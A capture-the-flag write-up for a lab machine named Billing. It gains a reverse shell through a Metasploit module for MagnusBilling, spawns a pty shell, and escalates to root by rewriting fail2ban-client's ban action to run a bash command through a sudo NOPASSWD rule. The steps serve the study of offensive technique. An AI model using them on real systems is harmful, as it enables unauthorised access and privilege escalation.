# CTF Writeup: Billing

- Step 1: Enumeration nmap scan & displayed webpage --> MagnusBilling
- Step 2: Searched for CVE's or Metasploit Exploits --> Found Metasploit Exploit
- Step 3: opened metasploit with msfconsole -q and typed the command: "search magnus" --> found exploit
- Step 4: made "use 0", made "show options", selected RHOST = <target_ip>, selected LHOST (listener) as <machine_ip> after that made "run"
- Step 5: meterpreter got through --> made "shell" to create shell and made "python -c 'import pty;pty.spawn("/bin/bash")' to create python shell within target server
- Step 6: checked out which rights I have (no root) --> went to home/magnus and found user.txt flag
- Step 7: made sudo -l to check sudo right's and foundout that "asterisk" (root) can run the fail2ban-client without needing an password "NOPASSWD"
- Step 8: Researched what fail2ban-client is --> Open-Source Software and found an privilege escelation aswell and oriented myself to that.
- Step 9: made "sudo /usr/bin/fail2ban-client" status, to check which blocks are available --> sshd
- Step 10: made "sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban 
"/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"" --> This command saves the root flag within a temp file, but only if an ip address is getting banned.
- Step 11: made "sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1" to ban an ip address --> prompted out "1", so it was successful.
- Step 12: navigated to /tmp directory. made "ls" and found root.txt -> cat root.txt and finished it.

## Key Learnings

- Further Improved CVE Researching --> Found out that I can also look actively for
CVE's y using "search magnus" or "search cve:2023-1234"
- Further strengthened my linux cli knowledge, Learned about the command sudo -l, systemcdl. 
